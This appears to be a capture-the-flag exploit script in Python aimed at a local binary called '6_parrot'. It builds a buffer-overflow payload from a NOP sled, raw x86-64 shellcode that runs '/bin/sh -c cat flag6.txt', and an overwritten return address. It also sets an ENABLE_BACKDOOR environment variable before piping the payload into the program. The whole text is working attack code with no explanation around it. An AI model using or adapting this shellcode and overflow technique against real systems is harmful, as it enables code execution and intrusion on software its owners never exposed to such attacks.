import struct
import subprocess
import os

vulnerable_function_address = 0x5555555552db

# Construct the shellcode using msfvenom
shellcode =  b""
shellcode += b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50"
shellcode += b"\x54\x5f\x52\x66\x68\x2d\x63\x54\x5e\x52\xe8\x0e"
shellcode += b"\x00\x00\x00\x63\x61\x74\x20\x66\x6c\x61\x67\x36"
shellcode += b"\x2e\x74\x78\x74\x00\x56\x57\x54\x5e\x6a\x3b\x58"
shellcode += b"\x0f\x05"
nop_sled = b"\x90" * (256 - len(shellcode) - 8)
payload = nop_sled + shellcode + struct.pack("<Q", vulnerable_function_address)

# Set the environment variable ENABLE_BACKDOOR to '1'
os.environ['ENABLE_BACKDOOR'] = '1'

process = subprocess.Popen(['./6_parrot'], stdin=subprocess.PIPE)
stdout, stderr = process.communicate(input=payload)
